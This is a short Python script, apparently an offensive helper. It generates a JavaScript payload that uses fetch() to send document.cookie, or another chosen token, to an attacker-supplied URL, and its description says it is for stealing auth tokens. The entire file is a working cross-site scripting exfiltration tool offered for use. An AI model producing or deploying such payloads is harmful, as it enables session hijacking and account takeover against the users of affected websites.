#!/usr/bin/env python3
import argparse

def generate(url, token="document.cookie"):
    return "fetch(\"{0}?a=\"+{1})".format(url, token)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate a javascript script to steam auth tokens")
    parser.add_argument('url',
        help="The URL to send the token to")
    parser.add_argument('-t',
        "--token", 
        default="document.cookie",
        help="The code to access the token you want")

    args = parser.parse_args()

    print(generate(args.url, token=args.token))

